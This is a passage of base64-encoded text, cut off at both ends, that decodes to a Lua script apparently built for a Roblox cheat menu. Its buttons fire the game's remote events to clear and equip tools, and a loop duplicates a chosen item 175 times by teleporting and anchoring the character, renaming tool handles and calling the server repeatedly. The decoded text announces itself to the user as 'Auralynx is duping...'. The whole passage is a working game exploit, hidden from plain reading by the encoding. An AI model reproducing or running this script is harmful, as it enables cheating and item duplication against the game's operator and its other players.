jb21iaW5hdGlvbi4iLAogICAgT3B0aW9ucyA9IChmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgY29tYmluYXRpb25OYW1lcyA9IHt9CiAgICAgICAgZm9yIF8sIGNvbWJpbmF0aW9uIGluIGlwYWlycyhjb2xvckNvbWJpbmF0aW9ucykgZG8KICAgICAgICAgICAgdGFibGUuaW5zZXJ0KGNvbWJpbmF0aW9uTmFtZXMsIGNvbWJpbmF0aW9uLk5hbWUpCiAgICAgICAgZW5kCiAgICAgICAgcmV0dXJuIGNvbWJpbmF0aW9uTmFtZXMKICAgIGVuZCkoKSwKICAgIERlZmF1bHQgPSBjb2xvckNvbWJpbmF0aW9uc1sxXS5OYW1lLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzZWxlY3RlZCkKICAgICAgICBmb3IgXywgY29tYmluYXRpb24gaW4gaXBhaXJzKGNvbG9yQ29tYmluYXRpb25zKSBkbwogICAgICAgICAgICBpZiBjb21iaW5hdGlvbi5OYW1lID09IHNlbGVjdGVkIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uIGFwcGx5RG91YmxlQ29sb3IoKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIExvY2FsUGxheWVyID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIKICAgICAgICAgICAgICAgICAgICBsb2NhbCBiYWNrcGFjayA9IExvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdG9vbEluZGV4ID0gMAogICAgICAgICAgICAgICAgICAgIGxvY2FsIGNvbG9ycyA9IGNvbWJpbmF0aW9uLkNvbG9ycwoKICAgICAgICAgICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBjaGFuZ2VUb29sQ29sb3IodG9vbCwgY29sb3IpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2w6SXNBKCJUb29sIikgYW5kIHRvb2wuTmFtZSA9PSAiUGFpbnRSb2xsZXIiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFNldENvbG9yID0gdG9vbDpGaW5kRmlyc3RDaGlsZCgiU2V0Q29sb3IiLCB0cnVlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgU2V0Q29sb3IgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNldENvbG9yOkZpcmVTZXJ2ZXIoY29sb3IpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgIGZvciBfLCB0b29sIGluIGlwYWlycyhiYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sLk5hbWUgPT0gIlBhaW50Um9sbGVyIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sSW5kZXggPSB0b29sSW5kZXggKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBjb2xvciA9IGNvbG9yc1sodG9vbEluZGV4IC0gMSkgJSAyICsgMV0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNoYW5nZVRvb2xDb2xvcih0b29sLCBjb2xvcikKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHRvb2wgaW4gaXBhaXJzKGNoYXJhY3RlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sLk5hbWUgPT0gIlBhaW50Um9sbGVyIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sSW5kZXggPSB0b29sSW5kZXggKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBjb2xvciA9IGNvbG9yc1sodG9vbEluZGV4IC0gMSkgJSAyICsgMV0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNoYW5nZVRvb2xDb2xvcih0b29sLCBjb2xvcikKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVxdWlwQW5kVW5lcXVpcFRvb2xzKGFwcGx5RG91YmxlQ29sb3IpCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gUmVmZXJlbmNlcyB0byByZW1vdGVzCmxvY2FsIGNsZWFydG9vbHJlbW90ZSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMUNsZWExclRvb2wxcyIpCmxvY2FsIHBpY2t0b29scmVtb3RlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJFOkZpbmRGaXJzdENoaWxkKCIxVG9vMWwiKQoKLS0gSXRlbSBjb250cm9sIHNlY3Rpb24KbG9jYWwgU2VjdGlvbiA9IFRvb2xzVGFiOkFkZFNlY3Rpb24oewogICAgTmFtZSA9ICLwn46S77ixSXRlbXMgZnVuY3Rpb25zIgp9KQoKLS0gQnV0dG9uIHRvIGNsZWFyIGFsbCB0b29scwpUb29sc1RhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJDbGVhciBhbGwiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgWzFdID0gIkNsZWFyQWxsVG9vbHMiCiAgICAgICAgfQogICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKTpXYWl0Rm9yQ2hpbGQoIlJFIik6V2FpdEZvckNoaWxkKCIxQ2xlYTFyVG9vbDFzIik6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICBlbmQKfSkKCi0tIFNlY3Rpb24gdG8gZXF1aXAgaXRlbXMKU2VjdGlvbiA9IFRvb2xzVGFiOkFkZFNlY3Rpb24oewogICAgTmFtZSA9ICLwn46S77ixRXF1aXAgaXRlbXMiCn0pCgotLSBCdXR0b24gdG8gZXF1aXAgYWxsIGl0ZW1zClRvb2xzVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkVxdWlwIGFsbCIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBmb3IgXywgdG9vbCBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiB0b29sOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gU2VjdGlvbiBmb3IgQ3Jvc3MgR3JpcApTZWN0aW9uID0gVG9vbHNUYWI6QWRkU2VjdGlvbih7CiAgICBOYW1lID0gIvCfjpLvuLFDcm9zcyBncmlwIgp9KQoKLS0gQnV0dG9uIGZvciBHaWFudCBKb3VzdCBCbHVlIENyb3NzClRvb2xzVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkdpYW50IEpvdXN0IEJsdWUgQ3Jvc3MiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICB0b29sc2VsY3RlZCA9ICJKb3VzdEJsdWUiCiAgICAgICAgZHVwZWFtb3QgPSAxNzUgLS1QdXQgYW1vdXRoIHRvIGR1cGUKICAgICAgICBwaWNrdG9vbHJlbW90ZSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMVRvbzFsIikKICAgICAgICBjbGVhcnRvb2xyZW1vdGUgPSBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUkU6RmluZEZpcnN0Q2hpbGQoIjFDbGVhMXJUb29sMXMiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGR1cGluZyA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvbGRjZiA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIse1RpdGxlPSJBdXJhbHlueCBpcyBkdXBpbmcuLi4iLFRleHQ9IlBsZWFzZSBkbyBub3QgZXF1aXAgYW55IHRvb2xzIG9yIHVuZXF1aXAgdG9vbHMgb3IgY2xpY2sgdG9vbHMgb24gaW52ZW50b3J5LiBJdCB3aWxsIGJyZWFrIHRoZSBzY3JpcHQuIiwgQnV0dG9uMSA9ICJPayIgLER1cmF0aW9uPTV9KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID09IHRydWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3YWl0KDAuMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgbT0xLDIgZG8gdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoOTk5OTk5OTk5LjQxNCwgLTQ5MCwgOTk5OTk5OTk5LjQxNCwgMC45NzQzNjA0MDYsIC0wLjE3NTczNDA4OCwgMC4xNDA0OTc2MSwgLTAuMTMzNDQxNDA0LCAwLjA1MTQwNTMwNjksIDAuOTg5NzIyNzI5LCAtMC4xODExNTAzMDIsIC0wLjk4MzA5NDY5MiwgMC4wMjY2MzcwOTIyKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdhaXQoMC41KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBhaWRqLGFmaCBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGFmaC5OYW1lID09IHRvb2xzZWxjdGVkID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgYWZoOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhZmguUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGFpZWZoaWV3aHdmLGR2amJ2aiBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZHZqYnZqOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZHZqYnZqLk5hbWUgPT0gdG9vbHNlbGN0ZWQgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGR2amJ2ajpEZXN0cm95KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgdHRqdGp1dGp1dGpqdGosZGR2ZHZkc3ZkZmJybnl0eXRtdmR2IGluIHBhaXJzKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZGR2ZHZkc3ZkZmJybnl0eXRtdmR2OklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZGR2ZHZkc3ZkZmJybnl0eXRtdmR2Lm5hbWUgPT0gdG9vbHNlbGN0ZWQgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRkdmR2ZHN2ZGZicm55dHl0bXZkdjpEZXN0cm95KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgZmluZGluLHRvb2xsZWwgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sbGVsOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9vbGxlbC5OYW1lID09IHRvb2xzZWxjdGVkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sbGxsZm91bjIgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGJhc2MsYWlqZncgaW4gcGFpcnModG9vbGxlbDpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgYWlqZncuTmFtZSA9PSAiSGFuZGxlIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFpamZ3Lk5hbWUgPSAiSMOiIMKlYcOiIMKlbsOiIMKlZMOiIMKlbMOiIMKlZSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxlbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsZWwuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9sbGxsYWhoaGggPSB0b29sbGVsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgdG9vbGxsbGZvdW4yID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgZmlpZmksdG9vbGxsbCBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9vbGxsbDpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2xsbGwuTmFtZSA9PSB0b29sc2VsY3RlZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsbGZvdW4gPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIG5hbmEsampzanNqIGluIHBhaXJzKHRvb2xsbGw6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGpqc2pzai5OYW1lID09ICJIYW5kbGUiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBqanNqc2ouTmFtZSA9ICJIw6IgwqVhw6IgwqVuw6IgwqVkw6IgwqVsw6IgwqVlIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sbGxsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sbGxsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsZmZlbCA9IHRvb2xsbGwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHRvb2xsbGxmb3VuID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2xsbGxmb3VuID09IHRydWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvb2xsbGZmZWwpID09IG5pbCB0aGVuICB0b29sbGxsZm91biA9IGZhbHNlIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b29sbGxmZmVsKSA9PSBuaWwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sbGxsZm91biA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9vbGxsbGZvdW4yID09IHRydWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b2xsbGxhaGhoaCkgPT0gbmlsIHRoZW4gdG9vbGxsbGZvdW4yID0gZmFsc2UgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgd2FpdCgpIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9sbGxsYWhoaGgpID09IG5pbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsbGZvdW4yID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3YWl0KDEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIG09MSwgZHVwZWFtb3QgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBtIDw9IGR1cGVhbW90IHRoZW4KICAgICAgICAgICAgICAgIGVsc2VpZiBtID09IGR1cGVhbW90IG9yIG0gPj0gZHVwZWFtb3QgLSAxIHRoZW4KICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWzFdID0gIlBpY2tpbmdUb29scyIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsyXSA9IHRvb2xzZWxjdGVkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBpY2t0b29scmVtb3RlOkludm9rZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpXYWl0Rm9yQ2hpbGQodG9vbHNlbGN0ZWQpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyW3Rvb2xzZWxjdGVkXTpGaW5kRmlyc3RDaGlsZCgiSGFuZGxlIikuTmFtZSA9ICJIw6IgwqVhw6IgwqVuw6IgwqVkw6IgwqVsw6IgwqVlIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvb2xzZWxjdGVkKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKHRvb2xzZWxjdGVkKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpOkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpIHVudGlsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbHNlbGN0ZWQpID09IG5pbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0IHdhaXQoKSB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikgPT0gbmlsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0IHdhaXQoKSB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGa